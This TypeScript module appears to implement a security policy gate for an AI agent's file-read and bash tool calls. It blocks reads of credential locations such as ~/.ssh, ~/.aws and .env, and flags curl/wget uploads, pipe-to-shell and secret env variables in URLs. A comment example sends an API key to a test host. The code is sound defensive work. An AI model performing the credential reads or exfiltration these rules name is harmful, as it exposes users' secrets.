import { parseBashCommand, splitBashCommandChain, splitPipelineStages } from "./policy-bash.js";
import type {
  GateRequest,
  ParsedCommand,
  PolicyDecision,
  ResolvedHeuristics,
} from "./policy-types.js";

/**
 * Flags on curl/wget that indicate outbound data transfer.
 * Matches short flags (-d, -F, -T) and long flags (--data, --form, etc.).
 */
const CURL_DATA_FLAGS = new Set([
  "-d",
  "--data",
  "--data-raw",
  "--data-binary",
  "--data-urlencode",
  "-F",
  "--form",
  "--form-string",
  "-T",
  "--upload-file",
  "--json",
]);

const CURL_WRITE_METHODS = new Set(["POST", "PUT", "DELETE", "PATCH"]);
const WGET_DATA_FLAGS = new Set(["--post-data", "--post-file"]);

const SECRET_ENV_HINTS = ["KEY", "TOKEN", "SECRET", "PASSWORD", "CREDENTIAL", "AUTH"];

const SECRET_FILE_READ_EXECUTABLES = new Set([
  "cat",
  "head",
  "tail",
  "less",
  "more",
  "grep",
  "rg",
  "awk",
  "sed",
]);

/**
 * Directories that always contain secret material.
 * Matches both absolute paths (/.ssh/) and home-relative (~/.ssh/).
 */
const SECRET_DIRS = ["ssh", "aws", "gnupg", "docker", "kube", "azure"];

/**
 * Config subdirectories that contain secret material.
 * Matched under ~/.config/NAME/ or PATH/.config/NAME/
 */
const SECRET_CONFIG_DIRS = [
  "gh", // GitHub CLI tokens (hosts.yml)
  "gcloud", // GCP credentials
];

/**
 * Specific dotfiles in the home directory that contain credentials.
 * Matched as exact filenames at the end of a path.
 */
const SECRET_DOTFILES = [
  ".npmrc", // npm auth tokens
  ".netrc", // login credentials for curl/wget/ftp
  ".pypirc", // PyPI upload tokens
];

function isLikelySecretEnvName(envName: string): boolean {
  const upper = envName.toUpperCase();
  return SECRET_ENV_HINTS.some((hint) => upper.includes(hint));
}

/**
 * Detect likely secret env expansion in curl/wget URL arguments.
 *
 * Example: curl "https://x.test/?token=$OPENAI_API_KEY"
 */
export function hasSecretEnvExpansionInUrl(parsed: ParsedCommand): boolean {
  if (parsed.executable !== "curl" && parsed.executable !== "wget") return false;

  const envRef = /\$(?:\{([A-Za-z_][A-Za-z0-9_]*)\}|([A-Za-z_][A-Za-z0-9_]*))/g;

  for (const arg of parsed.args) {
    const lowerArg = arg.toLowerCase();
    if (!lowerArg.includes("http://") && !lowerArg.includes("https://")) continue;

    let match: RegExpExecArray | null;
    while ((match = envRef.exec(arg)) !== null) {
      const envName = match[1] || match[2];
      if (envName && isLikelySecretEnvName(envName)) {
        return true;
      }
    }
  }

  return false;
}

function isSecretPath(pathCandidate: string): boolean {
  const normalized = pathCandidate
    .trim()
    .replace(/^['"]|['"]$/g, "")
    .toLowerCase();

  if (!normalized || normalized === "-" || normalized.startsWith("-")) return false;

  // Secret directories: ~/.ssh/, ~/.aws/, ~/.docker/, etc.
  for (const dir of SECRET_DIRS) {
    if (
      normalized.includes(`/.${dir}/`) ||
      normalized.startsWith(`~/.${dir}/`) ||
      normalized.endsWith(`/.${dir}`) ||
      normalized === `~/.${dir}`
    ) {
      return true;
    }
  }

  // Secret config subdirectories: ~/.config/gh/, ~/.config/gcloud/, etc.
  for (const dir of SECRET_CONFIG_DIRS) {
    if (
      normalized.includes(`/.config/${dir}/`) ||
      normalized.startsWith(`~/.config/${dir}/`) ||
      normalized.endsWith(`/.config/${dir}`) ||
      normalized === `~/.config/${dir}`
    ) {
      return true;
    }
  }

  // Secret dotfiles: ~/.npmrc, ~/.netrc, ~/.pypirc
  for (const file of SECRET_DOTFILES) {
    if (normalized.endsWith(`/${file}`) || normalized === `~/${file}` || normalized === file) {
      return true;
    }
  }

  // .env files (various patterns)
  return (
    normalized === ".env" ||
    normalized.startsWith(".env.") ||
    normalized.endsWith("/.env") ||
    normalized.includes("/.env.")
  );
}

/**
 * Extract command substitution contents from a command string.
 *
 * Matches both $(cmd) and `cmd` forms. Not recursive — extracts
 * the outermost substitutions only.
 */
function extractCommandSubstitutions(command: string): string[] {
  const subs: string[] = [];

  // Match $(...) — handle nested parens with a simple depth counter
  let i = 0;
  while (i < command.length) {
    if (command[i] === "$" && command[i + 1] === "(") {
      let depth = 1;
      const start = i + 2;
      let j = start;
      while (j < command.length && depth > 0) {
        if (command[j] === "(") depth++;
        else if (command[j] === ")") depth--;
        j++;
      }
      if (depth === 0) {
        subs.push(command.slice(start, j - 1));
      }
      i = j;
    } else {
      i++;
    }
  }

  // Match `cmd` (backtick form)
  const backtickRe = /`([^`]+)`/g;
  let m: RegExpExecArray | null;
  while ((m = backtickRe.exec(command)) !== null) {
    subs.push(m[1]);
  }

  return subs;
}

/**
 * Check if a raw command string (including embedded substitutions)
 * references secret file paths.
 *
 * Scans both the command arguments directly and any $() / `` contents.
 */
export function hasSecretFileReference(command: string): boolean {
  const subs = extractCommandSubstitutions(command);

  for (const sub of subs) {
    // Parse the substitution as a command and check for secret file reads
    const stages = splitPipelineStages(sub);
    for (const stage of stages) {
      const parsed = parseBashCommand(stage);
      if (isSecretFileRead(parsed)) return true;
    }
  }

  return false;
}

/**
 * Detect direct secret-file reads via common file-reading commands.
 */
export function isSecretFileRead(parsed: ParsedCommand): boolean {
  const executable = parsed.executable.includes("/")
    ? parsed.executable.split("/").pop() || parsed.executable
    : parsed.executable;

  if (!SECRET_FILE_READ_EXECUTABLES.has(executable)) return false;

  return parsed.args.some((arg) => isSecretPath(arg));
}

/**
 * Detect if a parsed command sends data to an external service.
 *
 * Checks for curl/wget with data-sending flags or explicit write methods.
 * Does NOT flag simple GET requests (curl https://example.com) — those
 * are reads, not external actions on the user's behalf.
 */
export function isDataEgress(parsed: ParsedCommand): boolean {
  if (parsed.executable === "curl") {
    for (let i = 0; i < parsed.args.length; i++) {
      const arg = parsed.args[i];

      // Exact flag match: -d, --data, -F, --json, etc.
      if (CURL_DATA_FLAGS.has(arg)) return true;

      // Long flag with = : --data=value, --json=value
      const eqIdx = arg.indexOf("=");
      if (eqIdx > 0 && CURL_DATA_FLAGS.has(arg.slice(0, eqIdx))) return true;

      // Explicit write method: -X POST, --request PUT, -XPOST (no space)
      if (arg === "-X" || arg === "--request") {
        const next = parsed.args[i + 1]?.toUpperCase();
        if (next && CURL_WRITE_METHODS.has(next)) return true;
      }
      // Compact form: -XPOST, -XPUT, etc.
      if (arg.startsWith("-X") && arg.length > 2) {
        const method = arg.slice(2).toUpperCase();
        if (CURL_WRITE_METHODS.has(method)) return true;
      }
    }
    return false;
  }

  if (parsed.executable === "wget") {
    for (const arg of parsed.args) {
      if (WGET_DATA_FLAGS.has(arg)) return true;
      const eqIdx = arg.indexOf("=");
      if (eqIdx > 0 && WGET_DATA_FLAGS.has(arg.slice(0, eqIdx))) return true;
    }
    return false;
  }

  return false;
}

export function evaluateSecretFileAccess(
  tool: string,
  input: Record<string, unknown>,
): PolicyDecision | null {
  if (tool === "read") {
    const path = (input as { path?: string }).path;
    if (path && isSecretPath(path)) {
      return {
        action: "deny",
        reason: "Blocked access to secret credential files",
        layer: "hard_deny",
        ruleLabel: "Protect secret files",
      };
    }
  }

  if (tool === "bash") {
    const command = (input as { command?: string }).command || "";
    const segments = splitBashCommandChain(command);

    for (const segment of segments) {
      // Check for secret file reads in pipeline stages
      const stages = splitPipelineStages(segment);
      for (const stage of stages) {
        const parsed = parseBashCommand(stage);
        if (isSecretFileRead(parsed)) {
          return {
            action: "deny",
            reason: "Blocked access to secret credential files",
            layer: "hard_deny",
            ruleLabel: "Protect secret files",
          };
        }
      }

      // Check for secret file references inside command substitutions
      if (hasSecretFileReference(segment)) {
        return {
          action: "deny",
          reason: "Blocked secret file access via command substitution",
          layer: "hard_deny",
          ruleLabel: "Protect secret files",
        };
      }
    }
  }

  return null;
}

/**
 * Evaluate structural policy heuristics for a gate request.
 */
export function evaluateConfiguredHeuristics(
  req: GateRequest,
  heuristics: ResolvedHeuristics,
): PolicyDecision | null {
  const { tool, input } = req;

  if (heuristics.secretFileAccess !== false) {
    const secretDeny = evaluateSecretFileAccess(tool, input);
    if (secretDeny) {
      secretDeny.action = heuristics.secretFileAccess;
      return secretDeny;
    }
  }

  if (tool === "bash") {
    const command = (input as { command?: string }).command || "";
    const segments = splitBashCommandChain(command);

    for (const segment of segments) {
      if (heuristics.pipeToShell !== false && /\|\s*(ba)?sh\b/.test(segment)) {
        return {
          action: heuristics.pipeToShell,
          reason: "Pipe to shell (arbitrary code execution)",
          layer: "rule",
          ruleLabel: "Pipe to shell",
        };
      }

      const stages = splitPipelineStages(segment);
      for (const stage of stages) {
        const parsed = parseBashCommand(stage);

        if (heuristics.dataEgress !== false && isDataEgress(parsed)) {
          return {
            action: heuristics.dataEgress,
            reason: "Outbound data transfer",
            layer: "rule",
            ruleLabel: "Data egress",
          };
        }

        if (heuristics.secretEnvInUrl !== false && hasSecretEnvExpansionInUrl(parsed)) {
          return {
            action: heuristics.secretEnvInUrl,
            reason: "Possible secret env exfiltration in URL",
            layer: "rule",
            ruleLabel: "Secret env expansion in URL",
          };
        }
      }
    }
  }

  return null;
}
